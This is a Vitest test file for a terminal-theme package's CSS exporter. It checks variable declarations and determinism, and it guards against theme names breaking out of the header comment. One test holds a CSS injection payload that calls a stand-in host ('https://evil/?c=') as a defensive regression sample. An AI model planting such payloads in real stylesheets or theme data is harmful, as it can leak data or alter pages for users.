import { describe, expect, it } from 'vitest';
import { escapeCssComment, themeToCssFile } from '../src/css-export.js';
import { themeToCssVars } from '../src/index.js';
import { COLOR_KEYS } from '../src/types.js';
import type { ColorKey, ColorValue, Colors } from '../src/types.js';

function cv(css: string): ColorValue {
  return { hex: '#000000', oklch: { l: 0, c: 0, h: 0 }, oklchCss: css };
}

function makeColors(): Colors {
  const colors = {} as Colors;
  for (const key of COLOR_KEYS) {
    colors[key] = cv(`oklch(0.5 0.1 ${key.length})`);
  }
  return colors;
}

describe('themeToCssFile', () => {
  const theme = { slug: 'my-theme', name: 'My Theme', colors: makeColors() };

  it('emits a header comment, a bare :root block, and a scoped block', () => {
    const css = themeToCssFile(theme);
    expect(css).toMatch(/^\/\* My Theme — oklch-terminal-themes/);
    expect(css).toContain(':root {\n');
    expect(css).toContain('[data-terminal-theme="my-theme"] {\n');
  });

  it('both blocks carry the exact same --terminal-* declarations as themeToCssVars', () => {
    const css = themeToCssFile(theme);
    const vars = themeToCssVars(theme);
    const varLines = vars.split('\n').filter((l) => l.length > 0);
    for (const line of varLines) {
      // Each declaration line appears twice: once per block, indented by 2.
      const occurrences = css.split(`  ${line}`).length - 1;
      expect(occurrences).toBe(2);
    }
  });

  it('every ColorKey has a --terminal-<kebab-key> declaration', () => {
    const css = themeToCssFile(theme);
    for (const key of COLOR_KEYS as readonly ColorKey[]) {
      const kebab = key.replace(/([a-z])([A-Z])/g, '$1-$2').toLowerCase();
      expect(css).toContain(`--terminal-${kebab}:`);
    }
  });

  it('is deterministic — identical input yields byte-identical output', () => {
    expect(themeToCssFile(theme)).toBe(themeToCssFile({ ...theme }));
  });

  it('the scoped selector uses the raw slug — safe because toSlug output is already [a-z0-9-]+', () => {
    const weirdSlug = { slug: 'abc-123', name: 'X', colors: makeColors() };
    const css = themeToCssFile(weirdSlug);
    expect(css).toContain('[data-terminal-theme="abc-123"]');
  });
});

describe('escapeCssComment (#190)', () => {
  it('neutralizes a comment terminator so the header cannot be escaped', () => {
    // CSS comments have no escape mechanism, so the only defence is making
    // the terminator unreachable. A theme name that closed the header comment
    // would turn the remainder into live rules in data/css/<slug>.css — a
    // file this package ships to npm and advertises as <link>-able.
    const payload = 'x */ body{background:url(https://evil/?c=)} /*';
    expect(escapeCssComment(payload)).not.toContain('*/');
  });

  it('leaves ordinary names untouched', () => {
    for (const name of ['Dracula', 'Gruvbox Dark (Hard)', 'Solarized Light', 'C64']) {
      expect(escapeCssComment(name)).toBe(name);
    }
  });

  it('the emitted file cannot be broken out of via the name', () => {
    const css = themeToCssFile({
      slug: 'evil',
      name: 'x */ body{color:red} /*',
      colors: makeColors(),
    });
    // Everything before the first newline is the header comment; it must be
    // the ONLY comment terminator in the file.
    const header = css.slice(0, css.indexOf('\n'));
    expect(header.endsWith('*/')).toBe(true);
    expect(header.indexOf('*/')).toBe(header.length - 2);
  });
});
